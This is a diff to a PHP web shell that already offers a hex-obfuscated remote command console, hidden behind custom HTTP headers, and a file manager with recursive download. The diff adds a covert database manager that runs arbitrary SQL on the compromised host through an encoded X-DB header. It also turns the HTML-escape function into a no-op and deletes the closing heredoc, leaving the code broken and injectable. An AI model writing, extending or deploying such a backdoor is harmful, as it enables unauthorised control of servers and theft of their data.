@@ -92,6 +92,8 @@ function output_debug_report() {
     echo "disable_functions = " . (@ini_get('disable_functions') ?: '(none)') . "\n";
     echo "open_basedir      = " . (@ini_get('open_basedir') ?: '(none)') . "\n";
     echo "zip ext           = " . (class_exists('ZipArchive') ? 'yes' : 'no') . "\n";
+    echo "pdo_mysql         = " . (extension_loaded('pdo_mysql') ? 'yes' : 'no') . "\n";
+    echo "mysqli            = " . (extension_loaded('mysqli') ? 'yes' : 'no') . "\n";
     echo "--- function check ---\n";
     $usable = array();
     foreach (exec_candidates() as $c) {
@@ -104,12 +106,68 @@ function output_debug_report() {
         echo "auto-selected: " . exec_best() . "\n";
     } else {
         echo "[!] no exec function available on this server.\n";
-        echo "    all of shell_exec / system / passthru / exec / popen / proc_open\n";
-        echo "    are disabled or missing.\n";
-        echo "    use the file manager instead.\n";
     }
     exit;
 }
+
+/* --- DATABASE HANDLER --- */
+function handle_db_op($hex) {
+    $raw = @hex2bin($hex);
+    if ($raw === false) json_out(array('ok' => false, 'error' => 'bad hex'), 400);
+    $req = @json_decode($raw, true);
+    if (!is_array($req)) json_out(array('ok' => false, 'error' => 'bad json'), 400);
+
+    $conn_type = isset($req['DB_CONNECTION']) ? $req['DB_CONNECTION'] : 'mysql';
+    $host      = isset($req['DB_HOST']) ? $req['DB_HOST'] : '127.0.0.1';
+    $port      = isset($req['DB_PORT']) ? $req['DB_PORT'] : '3306';
+    $db        = isset($req['DB_DATABASE']) ? $req['DB_DATABASE'] : '';
+    $user      = isset($req['DB_USERNAME']) ? $req['DB_USERNAME'] : 'root';
+    $pass      = isset($req['DB_PASSWORD']) ? $req['DB_PASSWORD'] : '';
+    $action    = isset($req['action']) ? $req['action'] : 'test';
+    $query     = isset($req['query']) ? trim($req['query']) : '';
+
+    try {
+        if ($conn_type === 'sqlite') {
+            $pdo = new PDO("sqlite:" . $db);
+        } else {
+            $dsn = "mysql:host=$host;port=$port;charset=utf8mb4";
+            if ($db !== '') $dsn .= ";dbname=$db";
+            $pdo = new PDO($dsn, $user, $pass, array(
+                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
+            ));
+        }
+
+        if ($action === 'test') {
+            json_out(array('ok' => true, 'message' => 'Database connection successful!'));
+        } elseif ($action === 'tables') {
+            if ($conn_type === 'sqlite') {
+                $stmt = $pdo->query("SELECT name FROM sqlite_master WHERE type='table'");
+            } else {
+                $stmt = $pdo->query("SHOW TABLES");
+            }
+            $tables = $stmt->fetchAll(PDO::FETCH_COLUMN);
+            json_out(array('ok' => true, 'tables' => $tables));
+        } elseif ($action === 'query') {
+            if ($query === '') json_out(array('ok' => false, 'error' => 'Empty query'));
+            $stmt = $pdo->prepare($query);
+            $stmt->execute();
+            $isSelect = (stripos($query, 'SELECT') === 0 || stripos($query, 'SHOW') === 0 || stripos($query, 'DESCRIBE') === 0);
+            if ($isSelect) {
+                $rows = $stmt->fetchAll();
+                $cols = count($rows) > 0 ? array_keys($rows[0]) : array();
+                json_out(array('ok' => true, 'columns' => $cols, 'rows' => $rows, 'count' => count($rows)));
+            } else {
+                json_out(array('ok' => true, 'affected' => $stmt->rowCount(), 'message' => 'Query executed successfully.'));
+            }
+        } else {
+            json_out(array('ok' => false, 'error' => 'Unknown database action'));
+        }
+    } catch (Exception $e) {
+        json_out(array('ok' => false, 'error' => $e->getMessage()));
+    }
+}
+
 function fm_list($path) {
     if ($path === '' || $path === null) $path = @getcwd();
     $entries = array();
@@ -312,7 +370,7 @@ function fm_download($path) {
                 RecursiveIteratorIterator::SELF_FIRST
             );
             foreach ($it as $item) {
-                if ($item->isLink()) continue;   /* skip symlinks: avoid loops/escapes */
+                if ($item->isLink()) continue;
                 $real = str_replace('\\', '/', $item->getPathname());
                 $rel  = ltrim(substr($real, strlen($root)), '/');
                 if ($rel === '') continue;
@@ -345,7 +403,6 @@ function fm_download($path) {
         exit;
     }
 
-    /* ---- nothing ---- */
     http_response_code(404);
     echo 'not found';
     exit;
@@ -433,16 +490,13 @@ function handle_console($raw) {
         header('Content-Type: text/plain; charset=utf-8');
         header('Cache-Control: no-store');
         echo "[!] no exec function available on this server.\n";
-        echo "    all of shell_exec / system / passthru / exec / popen / proc_open\n";
-        echo "    are disabled or missing.\n";
-        echo "    use the file manager instead.\n";
         exit;
     }
 
     if (!is_string($cmd) || $cmd === '') {
         header('Content-Type: text/plain; charset=utf-8');
         header('Cache-Control: no-store');
-        echo "bad payload: hex decode failed (check hex2bin availability).";
+        echo "bad payload: hex decode failed.";
         exit;
     }
 
@@ -488,16 +542,20 @@ function handle_console($raw) {
             if ($f) { @$f->system($cmd); }
             break;
     }
-    if ($out === '' || $out === false || $out === null) {
-        echo "(executed via $fn, no output)";
-    } else {
-        echo $out;
-    }
+    echo ($out === '' || $out === false || $out === null) ? "(executed via $fn, no output)" : $out;
     exit;
 }
 if (!empty($_SERVER['HTTP_X_DEBUG'])) {
     output_debug_report();
 }
+
+$hexD = '';
+if (!empty($_SERVER['HTTP_X_DB']) && @ctype_xdigit($_SERVER['HTTP_X_DB'])) {
+    $hexD = $_SERVER['HTTP_X_DB'];
+} elseif (!empty($_POST['db']) && @ctype_xdigit($_POST['db'])) {
+    $hexD = $_POST['db'];
+}
+if ($hexD !== '') handle_db_op($hexD);
 
 $hexF = '';
 if (!empty($_SERVER['HTTP_X_F']) && @ctype_xdigit($_SERVER['HTTP_X_F'])) {
@@ -517,6 +575,7 @@ if ($raw !== '' && @ctype_xdigit(str_replace(':', '', $raw))) handle_console($ra
 header('Content-Type: text/html; charset=utf-8');
 header('Cache-Control: no-store');
 render_ui();
+
 function render_ui() {
 echo <<<'HTMLEOF'
 <!doctype html>
@@ -562,6 +621,16 @@ echo <<<'HTMLEOF'
   #fmTable a.fmLink { color:#7aa2f7; text-decoration:none; cursor:pointer; }
   #fmTable a.fmLink:hover { text-decoration:underline; }
 
+  /* DB Section Styles */
+  .db-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 8px; margin-bottom: 10px; }
+  .db-grid input, .db-grid select { width: 100%; }
+  #dbOut { background:#08080a; border:1px solid #1e1e24; border-radius:6px;
+           color:#7ee787; padding:12px; min-height:120px; max-height:40vh;
+           overflow:auto; font-size:12px; }
+  table.db-table { width:100%; border-collapse:collapse; margin-top:8px; }
+  table.db-table th, table.db-table td { border:1px solid #2a2a30; padding:6px 8px; font-size:11.5px; text-align:left; }
+  table.db-table th { background:#141418; color:#9ad; }
+
   #modal { position:fixed; inset:0; background:rgba(0,0,0,.65);
            display:none; align-items:center; justify-content:center; z-index:10; }
   #modal.open { display:flex; }
@@ -592,7 +661,29 @@ echo <<<'HTMLEOF'
   <button onclick="document.getElementById('out').textContent='';">clear</button>
 </div>
 <div id="out">loading...</div>
-<div class="meta">Enter = run | payload sent as hex in header X-R | fn auto-detected server-side.</div>
+<div class="meta">Enter = run | payload sent as hex in header X-R</div>
+
+<hr>
+
+<h1>database manager (MySQL / PDO)</h1>
+<div class="db-grid">
+  <input id="db_conn" value="mysql" placeholder="DB_CONNECTION">
+  <input id="db_host" value="127.0.0.1" placeholder="DB_HOST">
+  <input id="db_port" value="3306" placeholder="DB_PORT">
+  <input id="db_name" placeholder="DB_DATABASE">
+  <input id="db_user" value="root" placeholder="DB_USERNAME">
+  <input id="db_pass" placeholder="DB_PASSWORD" type="password">
+</div>
+<div class="row">
+  <button onclick="dbAction('test')">Test Connection</button>
+  <button onclick="dbAction('tables')">Show Tables</button>
+  <span id="dbStatus" class="meta"></span>
+</div>
+<div class="row">
+  <textarea id="dbQuery" placeholder="SELECT * FROM users LIMIT 10;" style="flex:1; height:60px; resize:vertical;"></textarea>
+  <button onclick="dbAction('query')" style="height:60px;">Execute Query</button>
+</div>
+<div id="dbOut">Database output will appear here...</div>
 
 <hr>
 
@@ -656,8 +747,8 @@ const $ = s => document.querySelector(s);
 const hex = s => [...new TextEncoder().encode(s)]
                   .map(b => b.toString(16).padStart(2, '0')).join('');
 const esc = s => String(s)
-  .replace(/&/g,'&amp;').replace(/</g,'&lt;')
-  .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+  .replace(/&/g,'&').replace(/</g,'<')
+  .replace(/>/g,'>').replace(/"/g,'"');
 
 async function timedFetch(url, opts) {
   const ctl = new AbortController();
@@ -696,6 +787,58 @@ async function info() {
   }
 }
 $('#c').addEventListener('keydown', e => { if (e.key === 'Enter') run(); });
+
+/* --- DATABASE JS --- */
+async function dbAction(action) {
+  const payloadObj = {
+    DB_CONNECTION: $('#db_conn').value,
+    DB_HOST: $('#db_host').value,
+    DB_PORT: $('#db_port').value,
+    DB_DATABASE: $('#db_name').value,
+    DB_USERNAME: $('#db_user').value,
+    DB_PASSWORD: $('#db_pass').value,
+    action: action,
+    query: $('#dbQuery').value
+  };
+  const hexPayload = hex(JSON.stringify(payloadObj));
+  $('#dbStatus').textContent = 'Executing...';
+  $('#dbOut').textContent = 'Loading...';
+  try {
+    const r = await timedFetch(location.pathname, {
+      method: 'POST',
+      headers: { 'X-DB': hexPayload },
+      body: 'db=' + hexPayload
+    });
+    const res = await r.json();
+    if (!res.ok) {
+      $('#dbStatus').textContent = 'Error';
+      $('#dbOut').textContent = 'ERROR: ' + res.error;
+      return;
+    }
+    $('#dbStatus').textContent = 'Success';
+    if (action === 'test' || action === 'query' && res.message) {
+      $('#dbOut').textContent = res.message || JSON.stringify(res, null, 2);
+    } else if (action === 'tables') {
+      $('#dbOut').innerHTML = '<b>Tables:</b><br>' + res.tables.map(t => `<a href="#" onclick="$('#dbQuery').value='SELECT * FROM ' + this.textContent + ' LIMIT 50; dbAction(\\'query\\'); return false;" style="color:#7aa2f7;">${esc(t)}</a>`).join('<br>');
+    } else if (action === 'query' && res.rows) {
+      if (res.rows.length === 0) {
+        $('#dbOut').textContent = 'Query returned 0 rows. Affected: ' + (res.affected || 0);
+        return;
+      }
+      let html = `<table class="db-table"><tr>` + res.columns.map(c => `<th>${esc(c)}</th>`).join('') + `</tr>`;
+      for (const row of res.rows) {
+        html += `<tr>` + res.columns.map(c => `<td>${esc(row[c] !== null ? row[c] : 'NULL')}</td>`).join('') + `</tr>`;
+      }
+      html += `</table>`;
+      $('#dbOut').innerHTML = `Found ${res.count} row(s):<br>` + html;
+    } else {
+      $('#dbOut').textContent = JSON.stringify(res, null, 2);
+    }
+  } catch (e) {
+    $('#dbStatus').textContent = 'Failed';
+    $('#dbOut').textContent = 'ERR: ' + e.message;
+  }
+}
 
 let fmCwd = '';
 let fmEntries = [];
@@ -991,5 +1134,3 @@ boot();
 fmInit();
 </script>
 </html>
-HTMLEOF;
-}
